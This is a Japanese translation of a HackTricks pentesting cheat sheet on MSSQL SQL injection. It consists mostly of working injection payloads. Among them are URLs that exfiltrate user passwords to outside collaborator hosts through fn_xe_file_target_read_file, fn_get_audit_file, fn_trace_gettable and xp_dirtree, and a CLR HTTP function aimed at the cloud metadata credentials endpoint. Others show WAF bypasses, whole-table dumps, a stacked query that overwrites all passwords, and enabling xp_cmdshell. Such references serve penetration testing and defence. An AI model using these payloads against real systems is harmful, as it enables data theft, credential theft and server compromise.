# MSSQLインジェクション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## アクティブディレクトリ列挙

MSSQLサーバー内でSQLインジェクションを利用して**ドメインユーザーを列挙する**ことが可能かもしれません。以下のMSSQL関数を使用します:

* **`SELECT DEFAULT_DOMAIN()`**: 現在のドメイン名を取得します。
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: ドメイン名(_DOMAIN_ がこの例)を知っている場合、この関数は**ユーザーAdministratorのSID**を16進数形式で返します。これは `0x01050000000[...]0000f401` のように見え、**最後の4バイト**が**500**という**ビッグエンディアン**形式の数値であることに注意してください。これは**一般的なユーザーadministratorのID**です。\
この関数を使用すると、**ドメインのID**（最後の4バイトを除くすべてのバイト）を知ることができます。
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : この関数は、指定された**IDのユーザー名**を返します（存在する場合）。この場合、**0000e803** はビッグエンディアンで**1000**になります（通常、これは最初に作成された通常ユーザーIDです）。その後、1000から2000までのユーザーIDをブルートフォースして、ドメインのユーザー名をすべて取得することが想像できます。例えば、次のような関数を使用して:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **代替エラーベースのベクトル**

エラーベースのSQLインジェクションは通常、`+AND+1=@@version--` のような構造や、「OR」演算子に基づく変種で見られます。このような表現を含むクエリは、通常WAFによってブロックされます。バイパスとして、求められるデータにデータ型変換エラーを引き起こす特定の関数呼び出しの結果と、%2b文字を使用して文字列を連結します。

そのような関数の例:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

関数 `USER_NAME()` の使用例：
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
## SSRF

### `fn_xe_file_target_read_file`
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**権限:** サーバーで **`VIEW SERVER STATE`** 権限が必要です。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**権限:** **`CONTROL SERVER`** 権限が必要です。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettable`
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**権限:** **`CONTROL SERVER`** 権限が必要です。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

MSSQLを使用してネットワークコールを行う最も一般的な方法は、Microsoftによって文書化されていない不思議なストアドプロシージャ `xp_dirtree` の使用です。これが原因で、[インターネット上の他の人々によって文書化されました](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)。この方法は、インターネット上の[Out of Band Data exfiltration](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)に関する[複数の例](https://www.notsosecure.com/oob-exploitation-cheatsheet/)で使用されています。

本質的に、
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
MySQLの`LOAD_FILE`のように、`xp_dirtree`を使用して**TCPポート445のみ**にネットワークリクエストを行うことができます。ポート番号を制御することはできませんが、ネットワーク共有から情報を読み取ることができます。

**PS：** これは、デフォルトの設定で`Windows Server 2016 Datacenter`上で実行されている`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`では機能しません。

**他にも**、同様の結果を得るために使用できるストアドプロシージャがあります。例えば[**`master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)や**`xp_subdirs`**などです。

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

明らかに、**`xp_cmdshell`**を使用して**実行**し、**SSRF**をトリガーする何かを行うこともできます。詳細については、ページ内の**関連セクションを読んでください**：

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL ユーザー定義関数 - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

**CLR UDF**（Common Language Runtime User Defined Function - **.NET**言語のいずれかで書かれ、**DLL**にコンパイルされたコード）を書き、MSSQL内でカスタム関数として**ロードする**のは比較的簡単です。ただし、これには`dbo`アクセスが**必要です**ので、webアプリケーションがデータベースに**`sa`または管理者ロールとして**接続していない限り、機能しない可能性があります。

[このGithubリポジトリには、Visual StudioプロジェクトとMSSQLにCLRアセンブリとしてバイナリをロードし、MSSQL内からHTTP GETリクエストを呼び出すためのインストール手順があります](https://github.com/infiniteloopltd/SQLHttp)。

`http.cs`コードは`WebClient`クラスを使用してGETリクエストを行い、指定された内容をフェッチします。
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
インストール手順では、`CREATE ASSEMBLY` クエリを実行する前に以下を実行し、アセンブリのSHA512ハッシュをサーバー上の信頼されたアセンブリのリストに追加します（リストは `select * from sys.trusted_assemblies;` を使用して確認できます）。
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
アセンブリが追加され、関数が作成されたら、以下を実行してHTTPリクエストを行うことができます。
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
## **クイックエクスプロイト: 一つのクエリでテーブル全体を取得**

テーブルの内容を一つのクエリで取得するには、FOR XML句またはFOR JSON句を使用する2つの簡単な方法があります。FOR XML句は「raw」などの指定されたモードを必要とするため、簡潔さの点でFOR JSONが優れています。

現在のデータベースからスキーマ、テーブル、カラムを取得するクエリ:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

エラーベースのベクターは、エイリアスまたは名前が必要です。なぜなら、エイリアスや名前がない表現の出力はJSONとしてフォーマットできないからです。
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **現在実行中のクエリの取得**

実行中のSQLクエリは、`sys.dm_exec_requests` と `sys.dm_exec_sql_text` にアクセスして取得できます：
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
**権限:** ユーザーがサーバーに対してVIEW SERVER STATE権限を持っている場合、そのユーザーはSQL Serverインスタンス上で実行中のすべてのセッションを確認できます。そうでない場合は、現在のセッションのみが表示されます。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **WAFバイパスのための小技**

非標準の空白文字: %C2%85 または %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
科学的（0e）および16進数（0x）表記によるUNIONの難読化：
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
FROMと列名の間に空白の代わりにピリオドを使用する：
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
SELECTと使い捨て列の間の\Nセパレータ：
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### WAFバイパスと非正統的なスタッククエリ

[**このブログ投稿**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)によると、";"を使用せずにMSSQLでクエリをスタックすることが可能です：

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

例えば、複数のクエリは次のようになります：
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
簡潔にすると：
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
したがって、この形式のクエリのスタッキングを考慮していない異なるWAFをバイパスすることが可能です。例えば：
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## 参考文献

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
